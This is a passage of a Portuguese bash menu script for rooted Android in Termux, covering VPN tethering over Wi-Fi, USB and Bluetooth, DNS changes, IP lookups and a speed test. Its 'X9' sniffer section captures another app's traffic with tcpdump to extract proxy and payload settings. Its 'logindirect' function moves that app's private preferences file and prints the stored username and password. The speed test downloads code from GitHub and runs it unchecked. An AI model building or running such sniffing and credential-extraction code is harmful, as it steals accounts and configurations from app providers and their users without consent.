    0) echo "VPN não encontrada" ; sleep 4 ; Menu2;;
    1) su -c 'svc wifi disable';;
     esac
}
check2
check1() {
    vpn=$(su -c ifconfig | grep -c wlan0)
    case $vpn in
    0) clear ; echo "Roteador Wi-Fi não está ligado" ; echo "Ligue ou tente o metodo 2" ; sleep 4 ; Menu2;;
    1) clear;;
     esac
}
check1

wifiip1=$( cat wifiip1 | grep "1" | cut -d'.' -f1-3)

Rotear=$(su -c iptables -t filter -F FORWARD && su -c iptables -t nat -F POSTROUTING && su -c iptables -t filter -I FORWARD -j ACCEPT && su -c iptables -t nat -I POSTROUTING -j MASQUERADE && su -c ip rule add from $wifiip1.0/24 lookup 61 && su -c ip route add default dev tun0 scope link table 61 && su -c ip route add $wifiip1.0/24 dev wlan0 scope link table 61 && su -c ip route add broadcast 255.255.255.255 dev wlan0 scope link table 61)
clear 

route=$(echo $Rotear | grep -c "File exists")
case $route in
0)echo -e "${GREEN}Compartilhamento via Wi-Fi iniciado" ; sleep 5 && su -c killall com.termux;;
1)echo -e "${RED}Pare o roteamento Wi-Fi atual antes de iniciar um novo${NADA}" ; sleep 7 && MetodoWIFI1;;
esac
}

AltRW2(){
clear
check1() {
    vpn=$(su -c ifconfig | grep -c wlan0)
    case $vpn in
    0) clear ; echo "Roteador Wi-Fi não está ligado" ; sleep 4 ; Menu2;;
    1) clear;;
     esac
}
check1

wifiip1=$( cat wifiip1 | grep "1" | cut -d'.' -f1-3)

su -c iptables -t filter -F FORWARD && su -c iptables -t filter -I FORWARD -j ACCEPT && su -c ip rule delete from $wifiip1.0/24 lookup 61 && su -c iptables -t nat -F POSTROUTING && su -c ip route delete default dev tun0 scope link table 61 && su -c ip route delete $wifiip1.0/24 dev wlan0 scope link table 61 && su -c ip route delete broadcast 255.255.255.255 dev wlan0 scope link table 61 ; clear ; echo "Compartilhamento via Wi-Fi parado" ; sleep 5 && Menu2
}


MetodoWIFI2(){
GREEN='\033[1;32m'
SCOLOR='\033[0m'
su -c 'svc wifi disable' && sleep 4
check1() {
    vpn=$(su -c ifconfig | grep -c swlan0)
    case $vpn in
    0) clear ; echo "Roteador Wi-Fi não está ligado" ; echo "Ligue ou tente o metodo 1" ; sleep 4 ; Menu2;;
    1) clear;;
     esac
}
check1
check5(){
      apps=$(cat wifiip2 | grep -c .)
    case $apps in
     1) clear;;
     2)clear;;
     3)clear;;
     4)clear;;
     *)su -c rm wifiip2 ; su -c ifconfig swlan0 | grep "inet addr" | grep -o inet............................... | cut -d' ' -f1-2 | cut -d':' -f2 | cut -d'.' -f1-4 >> wifiip2;;
     esac
}
check5
clear
echo -e '\n'
echo "     ==================================="
echo "              VIA ROTEADOR WI-FI     "
echo "        ==================================="
echo "               ESCOLHA UMA OPÇÃO"
echo
echo "        ==================================="
echo -e "            ${DESTACAR}[ 1 ] - Ligar"
echo -e "            [ 2 ] - Desligar"
echo -e "            [ 0 ] - Voltar${NADA}"
echo "         ==================================="
echo
echo "@alpacinoo007"
echo "@luanw04"
echo
    read -n1 -p "Escolha uma Opção: " Apps
    case $Apps in  
   1)AltRW21;;
   2)AltRW22;;
   0)WIFI;;
   *) MetodoWIFI2;;
    esac
    }


AltRW21(){
clear
check2() {
    vpn=$(su -c ifconfig | grep -c tun0)
    case $vpn in
    0) echo "VPN não encontrada" ; sleep 4 ; Menu2;;
    1) su -c 'svc wifi disable';;
     esac
}
check2
check1() {
    vpn=$(su -c ifconfig | grep -c swlan0)
    case $vpn in
    0) clear ; echo "Roteador Wi-Fi não está ligado" ; echo "Ligue ou tente o metodo 1" ; sleep 4 ; Menu2;;
    1) clear;;
     esac
}
check1

wifiip2=$( cat wifiip2 | grep "1" | cut -d'.' -f1-3)

Rotear=$(su -c iptables -t filter -F FORWARD && su -c iptables -t nat -F POSTROUTING && su -c iptables -t filter -I FORWARD -j ACCEPT && su -c iptables -t nat -I POSTROUTING -j MASQUERADE && su -c ip rule add from $wifiip2.0/24 lookup 61 && su -c ip route add default dev tun0 scope link table 61 && su -c ip route add $wifiip2.0/24 dev swlan0 scope link table 61 && su -c ip route add broadcast 255.255.255.255 dev swlan0 scope link table 61) 

route=$(echo $Rotear | grep -c "File exists")
case $route in
0)echo -e "${GREEN}Compartilhamento via Wi-Fi iniciado" ; sleep 5 && su -c killall com.termux;;
1)echo -e "${RED}Pare o roteamento Wi-Fi atual antes de iniciar um novo${NADA}" ; sleep 7 && MetodoWIFI2;;
esac
}





AltRW22(){
clear
check1() {
    vpn=$(su -c ifconfig | grep -c swlan0)
    case $vpn in
    0) clear ; echo "Roteador Wi-Fi não está ligado" ; sleep 4 ; Menu2;;
    1) clear;;
     esac
}
check1

wifiip2=$( cat wifiip2 | grep "1" | cut -d'.' -f1-3)

su -c iptables -t filter -F FORWARD && su -c iptables -t filter -I FORWARD -j ACCEPT && su -c ip rule delete from $wifiip2.0/24 lookup 61 && su -c iptables -t nat -F POSTROUTING && su -c ip route delete default dev tun0 scope link table 61 && su -c ip route delete $wifiip2.0/24 dev swlan0 scope link table 61 && su -c ip route delete broadcast 255.255.255.255 dev swlan0 scope link table 61 ; clear ; echo "Compartilhamento via Wi-Fi parado" ; sleep 5 && Menu2
}


USB(){
GREEN='\033[1;32m'
SCOLOR='\033[0m'
su -c 'svc wifi disable' && sleep 4
check1() {
    vpn=$(su -c ifconfig | grep -c rndis0)
    case $vpn in
    0) clear ; echo "Ancoragem USB não está ligada" ; sleep 4 ; Menu2;;
    1) clear;;
     esac
}
check1
check5(){
      apps=$(cat usbip | grep -c .)
    case $apps in
     1) clear;;
     2)clear;;
     3)clear;;
     4)clear;;
     *)su -c rm usbip ; su -c ifconfig rndis0 | grep "inet addr" | grep -o inet............................... | cut -d' ' -f1-2 | cut -d':' -f2 | cut -d'.' -f1-4 >> usbip ;;
     esac
}
check5
clear
echo -e '\n'
echo "     ==================================="
echo "                  VIA USB     "
echo "        ==================================="
echo "               ESCOLHA UMA OPÇÃO"
echo
echo "        ==================================="
echo -e "            ${DESTACAR}[ 1 ] - Ligar"
echo -e "            [ 2 ] - Desligar"
echo -e "            [ 0 ] - Voltar${NADA}"
echo "         ==================================="
echo
echo "@alpacinoo007"
echo "@luanw04"
echo
    read -n1 -p "Escolha uma Opção: " Apps
    case $Apps in  
   1)AltRU1;;
   2)AltRU2;;
   0)Menu2;;
   *) USB;;
    esac
    }


AltRU1(){
clear
check2() {
    vpn=$(su -c ifconfig | grep -c tun0)
    case $vpn in
    0) echo "VPN não encontrada" ; sleep 4 ; Menu2;;
    1) clear,;;
     esac
}
check2
check1() {
    vpn=$(su -c ifconfig | grep -c rndis0)
    case $vpn in
    0) clear ; echo "Ancoragem USB não está ligada" ; sleep 4 ; Menu2;;
    1) clear;;
     esac
}
check1

usbip=$( cat usbip | grep "1" | cut -d'.' -f1-3)
Rotear=$(su -c iptables -t filter -F FORWARD && su -c iptables -t nat -F POSTROUTING && su -c iptables -t filter -I FORWARD -j ACCEPT && su -c iptables -t nat -I POSTROUTING -j MASQUERADE && su -c ip rule add from $usbip.0/24 lookup 61 && su -c ip route add default dev tun0 scope link table 61 && su -c ip route add $usbip.0/24 dev rndis0 scope link table 61 && su -c ip route add broadcast 255.255.255.255 dev rndis0 scope link table 61) 

route=$(echo $Rotear | grep -c "File exists")
case $route in
0)echo -e "${GREEN}Compartilhamento via USB iniciado" ; sleep 5 && su -c killall com.termux;;
1)echo -e "${RED}Pare o roteamento USB atual antes de iniciar um novo${NADA}" ; sleep 7 && USB;;
esac
}


AltRU2(){
clear
check1() {
    vpn=$(su -c ifconfig | grep -c rndis0)
    case $vpn in
    0) clear ; echo "Ancoragem USB não está ligada" ; sleep 4 ; Menu2;;
    1) clear;;
     esac
}
check1

usbip=$( cat usbip | grep "1" | cut -d'.' -f1-3)

su -c iptables -t filter -F FORWARD && su -c iptables -t filter -I FORWARD -j ACCEPT && su -c ip rule delete from $usbip.0/24 lookup 61 && su -c iptables -t nat -F POSTROUTING && su -c ip route delete default dev tun0 scope link table 61 && su -c ip route delete $usbip.0/24 dev rndis0 scope link table 61 && su -c ip route delete broadcast 255.255.255.255 dev rndis0 scope link table 61 && clear ; echo "Compartilhamento via USB parado" ; sleep 5 && Menu2
}



Bluetooth(){
GREEN='\033[1;32m'
SCOLOR='\033[0m'
su -c 'svc wifi disable' && sleep 4
check1() {
    vpn=$(su -c ifconfig | grep -c bt-pan)
    case $vpn in
    0) clear ; echo "Nenhum aparelho conectado via Ancoragem Bluetooth" ; sleep 4 ; Menu2;;
    1) clear;;
     esac
}
check1
check5(){
      apps=$(cat btip | grep -c .)
    case $apps in
     1) clear;;
     2)clear;;
     3)clear;;
     4)clear;;
     *)su -c rm btip ; su -c ifconfig bt-pan | grep "inet addr" | grep -o inet............................... | cut -d' ' -f1-2 | cut -d':' -f2 | cut -d'.' -f1-4 >> btip;;
     esac
}
check5
clear
echo -e '\n'
echo "     ==================================="
echo "                VIA BLUETOOTH      "
echo "        ==================================="
echo "               ESCOLHA UMA OPÇÃO"
echo
echo "        ==================================="
echo -e "            ${DESTACAR}[ 1 ] - Ligar"
echo -e "            [ 2 ] - Desligar"
echo -e "            [ 0 ] - Voltar${NADA}"
echo "         ==================================="
echo
echo "@alpacinoo007"
echo "@luanw04"
echo
    read -n1 -p "Escolha uma Opção: " Apps
    case $Apps in  
   1)AltRB1;;
   2)AltRB2;;
   0)Menu2;;
   *) Bluetooth;;
    esac
    }



AltRB1(){
clear
check2() {
    vpn=$(su -c ifconfig | grep -c tun0)
    case $vpn in
    0) echo "VPN não encontrada" ; sleep 4 ; Menu2;;
    1) clear,;;
     esac
}
check2
check1() {
    vpn=$(su -c ifconfig | grep -c bt-pan)
    case $vpn in
    0) clear ; echo "Nenhum aparelho conectado via Ancoragem Bluetooth" ; sleep 4 ; Menu2;;
    1) clear;;
     esac
}
check1

btip=$( cat btip | grep "1" | cut -d'.' -f1-3)

Rotear=$(su -c iptables -t filter -F FORWARD && su -c iptables -t nat -F POSTROUTING && su -c iptables -t filter -I FORWARD -j ACCEPT && su -c iptables -t nat -I POSTROUTING -j MASQUERADE && su -c ip rule add from $btip.0/24 lookup 61 && su -c ip route add default dev tun0 scope link table 61 && su -c ip route add $btip.0/24 dev bt-pan scope link table 61 && su -c ip route add broadcast 255.255.255.255 dev bt-pan scope link table 61)

route=$(echo $Rotear | grep -c "File exists")
case $route in
0)echo -e "${GREEN}Compartilhamento via Bluetooth iniciado" ; sleep 5 && su -c killall com.termux;;
1)echo -e "${RED}Pare o roteamento Bluetooth atual antes de iniciar um novo${NADA}" ; sleep 7 && Bluetooth;;
esac
}

AltRB2(){
clear
check1() {
    vpn=$(su -c ifconfig | grep -c bt-pan)
    case $vpn in
    0) clear ; echo "Nenhum aparelho conectado via Ancoragem Bluetooth" ; sleep 4 ; Menu2;;
    1) clear;;
     esac
}
check1

btip=$( cat btip | grep "1" | cut -d'.' -f1-3)

su -c iptables -t filter -F FORWARD && su -c iptables -t filter -I FORWARD -j ACCEPT && su -c ip rule delete from $btip.0/24 lookup 61 && su -c iptables -t nat -F POSTROUTING && su -c ip route delete default dev tun0 scope link table 61 && su -c ip route delete $btip.0/24 dev bt-pan scope link table 61 && su -c ip route delete broadcast 255.255.255.255 dev bt-pan scope link table 61 && clear ; echo "Compartilhamento via Bluetooth parado" ; sleep 5 && Menu2
}



Menu3(){
clear
echo -e '\n'
echo "     ==================================="
echo "                    OUTROS     "
echo "        ==================================="
echo "               ESCOLHA UMA OPÇÃO"
echo
echo "        ==================================="
echo -e "            ${DESTACAR}[ 1 ] - Ver MBs Gastos ${CINZA}ROOT${NADA}"
echo -e "            ${DESTACAR}[ 2 ] - X9 de IP"
echo -e "            [ 3 ] - DNS Change ${CINZA}ROOT${NADA}"
echo -e "            ${DESTACAR}[ 4 ] - SpeedTest"
echo -e "            [ 5 ] - X9 de DDD"
echo -e "            [ 0 ] - Voltar${NADA}"
echo "         ==================================="
echo
echo "@alpacinoo007"
echo "@luanw04"
echo
    read -n1 -p "Escolha uma Opção: " Apps
    case $Apps in  
   1)Alter1;;
   2)Alter2;;
   3)Alter3;;
   4)Speed;;
   5)DDD;;
   0)MenuPrincipal;;
   *) Menu3;;
    esac
    }

Alter1(){
check() {
    su=$(su -h | grep -c "command")
    case $su in
    0) killall com.termux ; clear ; exit ;;
    1) clear;;
    esac
}
check
clear
check2() {
    vpn=$(ifconfig | grep -c tun0)
    case $vpn in
    0) echo "VPN não encontrada" ; sleep 4; Menu3;;
    1) clear ; su -c am start -n com.android.vpndialogs/com.android.vpndialogs.ManageDialog && Menu3;;
    esac
}
check2
}

Alter2(){
clear
echo -e "${DESTACAR}1 - IP Atual"
echo -e "2 - IP Personalizado"
echo -e "0 - Voltar ${NADA}"
echo
read -n1 -p "Escolha uma opção: " optione1211
  case $optione1211 in 
  2)clear ; read -p "DIGITE O IP: " Plain ; opiiy;;
  1)clear ; Plain=$(curl -s ipecho.net/plain) ; echo -e "SEU IP ATUAL É: ${GREEN}$Plain${SCOLOR}" ; echo;;
  0)Menu3;;
  *)Alter2;;
  esac

GREEN='\033[1;32m'
SCOLOR='\033[0m'



  read -n1 -p "QUER VER OS DETALHES DESSE IP? [Y/n] " optione
  case $optione in
  y) opiiy;;
  Y) opiiy;;
  *) Menu3;;
  esac
  }
  
opiiy(){
GREEN='\033[1;32m'
SCOLOR='\033[0m'
clear

clear 

IP=$(curl -s https://freegeoip.app/xml/$Plain | grep IP | cut -d'>' -f2 | cut -d'<' -f1) && echo -e "${DESTACAR}IP:${GREEN} $IP ${SCOLOR}" ; echo 

Pais=$(curl -s https://freegeoip.app/xml/$Plain | grep CountryName | cut -d'>' -f2 | cut -d'<' -f1) && echo -e "${DESTACAR}Pais:${GREEN} $Pais ${SCOLOR}" ; echo 

Code=$(curl -s https://freegeoip.app/xml/$Plain | grep CountryCode | cut -d'>' -f2 | cut -d'<' -f1) && echo -e "${DESTACAR}Codigo do Pais:${GREEN} $Code ${SCOLOR}" ; echo 

RegionName=$(curl -s https://freegeoip.app/xml/$Plain | grep RegionName | cut -d'>' -f2 | cut -d'<' -f1) && echo -e "${DESTACAR}Estado:${GREEN} $RegionName ${SCOLOR}" ; echo

CodeReg=$(curl -s https://freegeoip.app/xml/$Plain | grep RegionCode | cut -d'>' -f2 | cut -d'<' -f1) && echo -e "${DESTACAR}Codigo do Estado:${GREEN} $CodeReg ${SCOLOR}" ; echo

City=$(curl -s https://freegeoip.app/xml/$Plain | grep City | cut -d'>' -f2 | cut -d'<' -f1) && echo -e "${DESTACAR}Cidade:${GREEN} $City ${SCOLOR}" ; echo

ZipCode=$(curl -s https://freegeoip.app/xml/$Plain | grep ZipCode | cut -d'>' -f2 | cut -d'<' -f1) && echo -e "${DESTACAR}Codigo Postal:${GREEN} $ZipCode ${SCOLOR}" ; echo

FusoHorario=$(curl -s https://freegeoip.app/xml/$Plain | grep TimeZone | cut -d'>' -f2 | cut -d'<' -f1) && echo -e "${DESTACAR}Fuso Horario:${GREEN} $FusoHorario ${SCOLOR}" ; echo

Latitude=$(curl -s https://freegeoip.app/xml/$Plain | grep Latitude | cut -d'>' -f2 | cut -d'<' -f1) && echo -e "${DESTACAR}Latitude:${GREEN} $Latitude ${SCOLOR}" ; echo

Longitude=$(curl -s https://freegeoip.app/xml/$Plain | grep Longitude | cut -d'>' -f2 | cut -d'<' -f1) && echo -e "${DESTACAR}Longitude:${GREEN} $Longitude ${SCOLOR}"

echo
 read -n1 -p "APERTE QUALQUER TECLA PARA VOLTAR" optione1
  case $optione1 in
  *)Menu3;;
  esac
}

DDD(){
clear
clear ; read -p "DIGITE O DDD: " ddd1
echo
PuxarDDD=$(curl -s https://www.guialince.com.br/ddd/$ddd1)
Estado=$(echo "$PuxarDDD" | grep -a "/ddd/" | cut -d'>' -f7 | grep -a "/td" | grep -a "</td" | cut -d'<' -f1)

Cidade=$(echo "$PuxarDDD" | grep -a "/ddd/" | cut -d'>' -f4 | grep -a "/a" | grep -a "</a" | cut -d'<' -f1)

DDDQuanti=$(echo "$Cidade" | wc -l)
case $DDDQuanti in
1)echo -e "${RED}NENHUMA CIDADE ENCONTRADA COM ESSE DDD${NADA}";;
*)echo -e "${DESTACAR}NUMERO DE CIDADES ENCONTRADAS: $DDDQuanti${NADA}"
echo
for i in $(seq $DDDQuanti)
do
CidadeEnd=$(echo "$Cidade" | sed -n "$i"p)
EstadoEnd=$(echo "$Estado" | sed -n "$i"p) 
echo -e "${YELLOW}$CidadeEnd${NADA} | ${GREEN}$EstadoEnd${NADA}"
done
;;
esac

echo
read -n1 -p "APERTE QUALQUER TECLA PARA VOLTAR" optione1
  case $optione1 in
  *)Menu3;;
  esac
}



Alter3(){
check() {
    su=$(su -h | grep -c "command")
    case $su in
    0) killall com.termux ; clear ; exit ;;
    1) clear;;
    esac
}
check
   clear
echo -e '\n'
echo "     ==================================="
echo "                CHANGE DNS (ROOT)     "
echo "         ===================================" 
echo "                 ESCOLHA UM DNS"
echo
echo "        ==================================="
echo -e "              ${DESTACAR}[ 1 ] - CloudFire DNS"
echo -e "              [ 2 ] - OpenDNS"
echo -e "              [ 3 ] - Google DNS"
echo -e "              [ 4 ] - Ad Guard DNS"
echo -e "              [ 5 ] - DNS Watch"
echo -e "              [ 6 ] - GIGA DNS"
echo -e "              [ 7 ] - Clean Browsing DNS"
echo -e "              [ 8 ] - Quad9 DNS"
echo -e "              [ 9 ] - DNS Personalizado"
echo -e "              [ 0 ] - Voltar${NADA}"
echo "         ==================================="
echo 
echo "@alpacinoo007"
echo "@luanw04"
echo
    read -n1 -p "Escolha uma Opção: " App
    case $App in
    1) d1="1.1.1.1" ; d2="1.0.0.1" ; d3="2606:4700:4700::1111" ; d4="2606:4700:4700::1001" ; d5="1.1.1.1" ; d6="1.0.0.1" ; nome="CloudFire DNS";;
    2) d1="208.67.222.222" ; d2="208.67.220.220" ; d3="2620:119:35::35" ; d4="2620:119:53::53" ; d5="208.67.222.222" ; d6="208.67.220.220" ; nome="OpenDNS" ;;
    3) d1="8.8.8.8" ; d2="8.8.4.4" ; d3="2001:4860:4860::8888" ; d4="2001:4860:4860::8844" ; d5="8.8.8.8" ; d6="8.8.4.4" ; nome="Google Public DNS" ;;
    4) d1="176.103.130.130" ; d2="176.103.130.131" ; d3="2a10:50c0::ad1:ff" ; d4="2a10:50c0::ad2:ff" ; d5="176.103.130.130" ; d6="176.103.130.131" ; nome="Ad Guard DNS";;
    5) d1="84.200.69.80" ; d2="84.200.70.40" ; d3="2001:1608:10:25::1c04:b12f" ; d4="2001:1608:10:25::9249:d69b" ; d5="84.200.69.80" ; d6="84.200.70.40" ; nome="DNS Witch" ;;
    6) d1="189.38.95.95" ; d2="189.38.95.96" ; d3="2804:10:10::10" ; d4="2804:10:10::20" ; d5="189.38.95.95" ; d6="189.38.95.96" ; nome="GIGA DNS";;
    7) d1="185.228.168.9" ; d2="185.228.169.9" ; d3="2a0d:2a00:1::2" ; d4="2a0d:2a00:2::2" ; d5="185.228.168.9" ; d6="185.228.169.9" ; nome="Clean Browsing DNS" ;;
    8) d1="9.9.9.9" ; d2="149.112.112.112" ; d3="2620:fe::fe" ; d4="2620:fe::9" ; d5="9.9.9.9" ; d6="149.112.112.112" ; nome="Quad9 DNS" ;;
    9) App9;;
    0) Menu3;;
    *) Alter3;;
    esac
    connectdns
    }

App9(){
clear
 echo -e "ㅤㅤㅤ \emDigite o DNS Primario\em"
read d1
echo
echo -e "ㅤㅤ   \emDigite o DNS Secundario\em"
read d2
echo
echo -e "ㅤ     \emDigite o IPv6 Primario\em"
read d3
echo
echo -e "ㅤ     \emDigite o IPv6 Secundario\em"
read d4
echo ""
connect
}

connectdns () {
clear
su -c setprop net.dns1 $d1 && su -c setprop net.dns2 $d2 && su -c setprop net.dns3 $d3 && su -c setprop net.dns4 $d4 && su -c setprop net.rmnet0.dns1 $d1 && su -c setprop net.rmnet0.dns2 $d2 && clear && sleep 1 && echo "SEU DNS FOI ALTERADO PARA:" && sleep 1 && echo && echo "    $nome" && sleep 1 && echo && echo "DNS PRIMARIO:" && su -c getprop net.dns1 && sleep 1 && echo && echo "DNS SECUNDARIO:" && su -c getprop net.dns2 && sleep 1 && echo && echo "IPv6 PRIMARIO:" && su -c getprop net.dns3 && sleep 1 && echo && echo "IPv6 SECUNDARIO:" && su -c getprop net.dns4 && echo && echo
 read -n1 -p "APERTE QUALQUER TECLA PARA VOLTAR" optione1
  case $optione1 in
  *)Menu3;;
  esac
}

Speed(){
clear
echo "Sem internet..." && clear && curl -sO https://raw.githubusercontent.com/luanwillianzh/vpn/main/SpeedTest && chmod 777 SpeedTest ; clear 

read -p "QUER ATUALIZAR OS PACOTES? [Y/n] " optione
  case $optione in
  y) pkg install python3 -y ; sleep 3 ; spd;;
  Y) pkg install python3 -y ; sleep 3 ; spd;;
  n) spd;;
  N) spd;;
  *) spd;;
  esac
  }
  
spd(){
clear && python3 SpeedTest && echo

 read -n1 -p "APERTE QUALQUER TECLA PARA VOLTAR" optione1
  case $optione1 in
  *)Menu3;;
  esac
}







Menu4(){
check() {
    su=$(su -h | grep -c "command")
    case $su in
    0) killall com.termux ; clear ; exit ;;
    1) clear;;
    esac
}
check
read -p "QUER ATUALIZAR OS PACOTES? [Y/n] " optione
  case $optione in
  y) apt upgrade -y ; apt update -y && apt upgrade root-repo -y && pkg install tcpdump -y ; pkg install tsu ; sleep 3 ; X9sniffer;;
  Y) apt upgrade -y ; apt update -y && apt upgrade root-repo -y && pkg install tcpdump -y ; pkg install tsu ; sleep 3 ; X9sniffer ;;
  n) X9sniffer;;
  N) X9sniffer;;
  *) Menu4;;
  esac
  }
X9sniffer(){
clear
echo -e '\n'
echo "     ==================================="
echo "                  X9 DE ARQUIVOS     "
echo "         ===================================" 
echo "                ESCOLHA UMA OPÇÃO"
echo
echo "        ==================================="
echo -e "              ${DESTACAR}[ 1 ] - WebSocket Direct"
echo -e "              [ 2 ] - WS Payload + SSL"
echo -e "              [ 3 ] - V2Ray"
echo -e "              [ 4 ] - Direct"
echo -e "              [ 5 ] - Sniffar Tudo"
echo -e "              [ 0 ] - Voltar${NADA}"
echo "         ==================================="
echo 
echo "@alpacinoo007"
echo "@luanw04"
echo
    read -n1 -p "Escolha uma Opção: " App
    case $App in
    1)wsDirect;;
    2)wspayssl;;
    3)V2Ray;;
    4)direct;;
    5)SniffarAll;;
    0)MenuPrincipal;;
    *)X9sniffer;;
    esac
    }
    
    
   
    
wsDirect(){
GREEN='\033[1;32m'
SCOLOR='\033[0m'
Sniffer1
}
Sniffer1(){
clear
check7() {
    vpn=$(ifconfig | grep -c tun0)
    case $vpn in
    1) echo "DESCONECTE DA VPN ANTES" ; sleep 4 ; X9sniffer;;
    0) clear;;
     esac
}
check7
clear

echo -e "${DESTACAR}1 - Escolher Porta${NADA} ${CINZA}CAPTURA QUALQUER PROXY${NADA}"
echo -e "${DESTACAR}2 - Todas as Portas${NADA} ${CINZA}CAPTURA PROXYS COM INICIO ${NADA}104"
echo
read -n1 -p "Escolha uma Opção: " ComSemPorta
case $ComSemPorta in
1)ComPorta;;
2)TodasPortas;;
*)Sniffer1;;
esac
}

ComPorta(){
clear
su -c rm -f proxycriar.txt
su -c rm -f sniffer.txt
su -c rm -f proxys.txt
su -c rm -f proxy.txt
clear
echo -e "${DESTACAR}Ex: 80, 443, 8080, 8880, etc ${NADA}"
echo
read -p "ESCOLHA UMA PORTA: " Porta

clear

echo -e "${GREEN}CAPTURA INICIADA...${SCOLOR}" ; echo ; echo "AGORA ENTRE NO APP E INICIE A CONEXÃO" ; echo "E LOGO APÓS VOLTE PARA VER AS CAPTURAS"

Sniff=$(su -c tcpdump -c10 port ${Porta} -n -A)
echo -e "$Sniff" >> sniffer.txt

Proxys=$(cat sniffer.txt | grep -a ">" | cut -d'>' -f2 | cut -d'.' -f1-5 | cut -d':' -f1)
echo -e "$Proxys" >> proxycriar.txt

ProxyCreate=$(cat proxycriar.txt | grep -a -n 1 | grep -a 1: | cut -d':' -f2 | cut -d'.' -f1-5) && echo -e "$ProxyCreate" >> proxy.txt
clear

Proxy=$(cat proxy.txt | grep -a -n . | grep -a 1: | cut -d':' -f2 | cut -d'.' -f1-4 | grep -a -n . | grep -a 1: | cut -d':' -f2)

Port=$(cat proxy.txt | grep -a -n . | grep -a 1: | cut -d':' -f2 | cut -d'.' -f5 )

P1=$(head -c1K sniffer.txt | grep -a HTTP | cut -d' ' -f3 | cut -d'<' -f3)
P2=$(cat sniffer.txt | grep -a Host)
P3=$(cat sniffer.txt | grep -a Upgrade)


check2() {
    P13=$(cat sniffer.txt | grep -c websocket -i)
    case $P13 in
    0) echo "NADA ENCONTRADO NESSA PORTA" ; echo ; read -n1 -p "APERTE QUALQUER TECLA PARA VOLTAR" optione1
  case $optione1 in
  *)X9sniffer;;
  esac;;
    1) clear;;
     esac
}
check2
echo -e "${DESTACAR}INFORMAÇÔES ENCONTRADAS: ${NADA}"
echo

echo -e "${GREEN}GET / HTTP/1.1${SCOLOR}"
echo -e "${GREEN}$P2${SCOLOR}"
echo -e "${GREEN}Upgrade: websocket${SCOLOR}"
echo 
echo -e "${GREEN}Proxy:$Proxy${SCOLOR}"
echo -e "${GREEN}Porta: $Port${SCOLOR}"
echo 
echo -e "${DESTACAR}PAYLOAD: ${NADA}"
echo

echo -e "${GREEN}GET / HTTP/1.1[crlf]$P2[crlf]Upgrade: websocket[crlf][crlf]${SCOLOR}"

echo
read -p "QUER VER OS DETALHES? [Y/n]" optione12
  case $optione12 in
  y)cat sniffer.txt ; PegarinfoWSDirect11;;
  Y)cat sniffer.txt ; PegarinfoWSDirect11;;
  *)Verlogin1;;
  esac
}
PegarinfoWSDirect11(){
echo
  read -p "QUER BUSCAR ALGUMA INFO? [Y/n]" optione12 ; case $optione12 in 
  y)PegarinfoWSDirect22;;
  Y)PegarinfoWSDirect22;;
  *)Verlogin1;;
  esac
}
PegarinfoWSDirect22(){
read -p "DIGITE O QUE QUER PROCURAR: " info
case $info in
esac
echo
cat sniffer.txt | grep -a -i "$info"
PegarinfoWSDirect33
}
PegarinfoWSDirect33(){
echo
  read -p "QUER BUSCAR MAIS ALGUMA INFO? [Y/n]" optione12 ; case $optione12 in 
  y)PegarinfoWSDirect22;;
  Y)PegarinfoWSDirect22;;
  *)Verlogin1;;
  esac
}
Verlogin1(){
echo
read -n1 -p "QUER TENTAR CAPTURAR O LOGIN EM ALGUNS APPS [Y/n]" optione1
  case $optione1 in
  N)X9sniffer;;
  n)X9sniffer;;
  y)logindirect;;
  Y)logindirect;;
  *)X9sniffer;;
  esac
}
logindirect(){
su -c rm -f login.xml
clear
echo -e "\emCOLE O NOME DO PACOTE DO APP${SCOLOR}\em"
read App
echo ""

su -c mv /data/data/$App/shared_prefs/"$App"_preferences.xml login.xml

User=$(su -c cat login.xml | grep -a USERNAME | cut -d '>' -f2 | cut -d'<' -f1)

Pass=$(su -c cat login.xml | grep -a PASSWORD | cut -d '>' -f2 | cut -d'<' -f1)

clear
echo -e "${DESTACAR}INFORMAÇÔES ENCONTRADAS: ${NADA}"
echo

echo -e "${GREEN}GET / HTTP/1.1${SCOLOR}"
echo -e "${GREEN}$P2${SCOLOR}"
echo -e "${GREEN}Upgrade: websocket${SCOLOR}"
echo 
echo -e "${GREEN}Proxy:$Proxy${SCOLOR}"
echo -e "${GREEN}Porta: $Porta${SCOLOR}"
echo
echo -e "${GREEN}Usuario: $User${SCOLOR}"
echo -e "${GREEN}Senha: $Pass${SCOLOR}"
echo
echo -e "${DESTACAR}PAYLOAD: ${NADA}"
echo
echo -e "${GREEN}GET / HTTP/1.1[crlf]$P2[crlf]Upgrade: websocket[crlf][crlf]${SCOLOR}"
echo

 read -n1 -p "APERTE QUALQUER TECLA PARA VOLTAR" optione1
  case $optione1 in
  *)X9sniffer;;
  esac
}




TodasPortas(){
clear
su -c rm -f hostcreate.txt
su -c rm -f proxycriar.txt
su -c rm -f sniffer.txt
su -c rm -f proxys.txt
su -c rm -f proxycreator.txt
clear
echo -e "${GREEN}CAPTURA INICIADA...${SCOLOR}" ; echo ; echo "AGORA ENTRE NO APP E INICIE A CONEXÃO" ; echo "E LOGO APÓS VOLTE PARA VER AS CAPTURAS"

Sniff=$(su -c tcpdump -c55 -n -A)
echo -e "$Sniff" >> sniffer.txt

Proxycreator=$(cat sniffer.txt | grep -a 104 | cut -d' ' -f5 | grep -a 104)
echo -e "$Proxycreator" >> proxycreator.txt

clear
Proxys=$(cat proxycreator.txt | grep -a -n . | grep -a 1: | cut -d':' -f2)
echo -e "$Proxys" >> proxys.txt

HostCreate=$(cat sniffer.txt | grep -a Host)
echo -e "$HostCreate" >> hostcreate.txt

P1=$(head -c1K sniffer.txt | grep -a HTTP | cut -d' ' -f3 | cut -d'<' -f3)
P2=$(cat hostcreate.txt | grep -a -n . | grep -a 1: | cut -d':' -f2-7 | grep -a -n . | grep -a 1: | cut -d':' -f2-7)
P3=$(cat sniffer.txt | grep -a Upgrade)
Proxy=$(cat proxys.txt | grep -a -n 1 | grep -a 1: | cut -d':' -f2 | cut -d'.' -f1-4)
Porta=$(cat proxys.txt | grep -a -n 1 | grep -a 1: | cut -d':' -f2 | cut -d'.' -f5 | cut -d ":" -f1)
check2() {
    P13=$(cat sniffer.txt | grep -c websocket -i)
    case $P13 in
    0) echo "NADA ENCONTRADO" ; echo ; read -n1 -p "APERTE QUALQUER TECLA PARA VOLTAR" optione1
  case $optione1 in
  *)X9sniffer;;
  esac;;
    1) clear;;
     esac
}
check2
echo -e "${DESTACAR}INFORMAÇÔES ENCONTRADAS: ${NADA}"
echo

echo -e "${GREEN}GET / HTTP/1.1${SCOLOR}"
echo -e "${GREEN}$P2${SCOLOR}"
